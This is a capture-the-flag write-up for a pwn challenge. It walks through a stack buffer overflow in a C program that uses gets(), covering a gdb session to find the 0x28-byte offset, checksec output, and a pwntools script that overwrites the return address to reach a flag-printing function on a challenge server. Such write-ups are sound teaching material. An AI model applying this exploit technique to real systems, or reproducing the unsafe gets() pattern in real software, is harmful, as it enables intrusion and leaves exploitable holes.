# Nexus Corp Override

In this challenge, we are given a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/cu2025/pwn/overflow1) alongside with the following source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void unlock_credentials()
{
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("Could not open flag.txt");
        exit(1);
    }
    char flag[100];
    fgets(flag, sizeof(flag), fp);
    fclose(fp);
    printf("CREDENTIALS UNLOCKED: %s\n", flag);
    fflush(stdout);
}

void authenticate_user()
{
    char employee_id[24];
    int clearance_level = 0;
    
    printf("=== NEXUS CORP SECURITY TERMINAL ===\n");
fflush(stdout);
    printf("Enter your employee ID:\n");
fflush(stdout);
    gets(employee_id);
    
    printf("Welcome, %s!\n", employee_id);
    
    if (clearance_level == 0x1337) {
        printf("HIGH CLEARANCE DETECTED. Unlocking admin credentials...\n");
        unlock_credentials();
    } else {
        printf("INSUFFICIENT CLEARANCE. Access restricted to public areas.\n");
    }
}

int main()
{
    authenticate_user();
    return 0;
}
```


By looking a it ,we see a trivial buffer overflow:
```c
gets(employee_id);
```

## Exploitation

### Offset

We first need to figure out the offset between the `employee_id` variable and the saved return addreess.There are multiple ways to do this,but the easiest by far is with gdb.
```
[I] ◆ Downloads ❯❯❯ gdb overflow1
(gdb) b gets
Breakpoint 1 at 0x401070
(gdb) run
Starting program: /home/archstrike/Downloads/overflow1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
=== NEXUS CORP SECURITY TERMINAL ===
Enter your employee ID:

Breakpoint 1, 0x00007ffff7c81ef8 in gets ()
   from /usr/lib/libc.so.6
(gdb) i r rdi
rdi            0x7fffffffe6d0      140737488348880
(gdb) i f 1
Stack frame at 0x7fffffffe700:
 rip = 0x401295 in authenticate_user; saved rip = 0x4012f4
 called by frame at 0x7fffffffe710,
    caller of frame at 0x7fffffffe6d0
 Arglist at 0x7fffffffe6f0, args:
 Locals at 0x7fffffffe6f0, Previous frame's sp is 0x7fffffffe700
 Saved registers:
  rbp at 0x7fffffffe6f0, rip at 0x7fffffffe6f8
(gdb)
```
We see that the saved return address from `authenticate_user` is at `0x7fffffffe6f8` and our stack buffer is at `0x7fffffffe6d0`. There is a `0x28` difference between the two, which is the number of bytes we have to write before reaching the return address.

### Protections

Next,we look at the binary's protections:
```
[I] ◆ Downloads ❯❯❯ pwn checksec overflow1
[*] 'overflow1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

There is no canary, so we don't have to deal with it,and since there is no PIE either,we can use addresses directly.

### Final exploit
Our final script the is the following:

```python
from pwn import *

target = remote('34.66.146.178',9227)
elf = ELF('overflow1')

payload = b'a'*0x28 + p64(elf.symbols['unlock_credentials'])
target.sendline(payload)
target.interactive()
```
